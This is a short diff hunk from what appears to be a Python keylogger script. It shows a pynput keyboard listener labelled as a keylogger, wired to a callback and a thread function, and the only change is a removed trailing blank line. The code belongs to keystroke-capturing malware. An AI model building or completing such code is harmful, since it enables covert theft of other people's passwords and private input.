@@ -42,4 +42,3 @@ keylogger_listener=pynput.keyboard.Listener(on_press=callback_function)
 with keylogger_listener:
  thread_function()
  keylogger_listener.join()
-
